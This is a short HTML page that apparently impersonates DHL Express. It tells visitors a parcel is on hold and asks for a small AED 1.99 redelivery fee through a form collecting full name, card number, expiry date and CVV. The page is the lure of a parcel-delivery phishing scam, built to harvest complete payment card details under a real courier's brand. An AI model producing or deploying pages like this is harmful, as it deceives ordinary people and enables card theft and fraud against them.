<!doctype html><meta charset="utf-8"><title>DHL — Schedule your redelivery</title>
<h1>DHL Express — parcel on hold</h1>
<p>Your package could not be delivered. Pay a small redelivery fee of AED 1.99 to schedule redelivery.</p>
<form action="/pay" method="post">
  <input name="fullname" placeholder="Full name">
  <input name="cardnumber" placeholder="Card number">
  <input name="expiry" placeholder="MM/YY">
  <input name="cvv" placeholder="CVV">
  <button type="submit">Pay fee</button>
</form>
